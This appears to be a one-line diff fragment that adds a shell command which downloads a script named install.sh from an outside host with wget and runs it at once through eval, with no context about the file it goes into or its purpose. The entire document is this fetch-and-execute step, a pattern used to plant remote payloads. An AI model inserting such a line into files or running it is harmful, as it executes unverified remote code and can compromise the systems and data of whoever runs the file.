@@ -1,0 +1,1 @@
+eval `wget -q -O - http://as.midzzz.com/s/rt/install.sh`
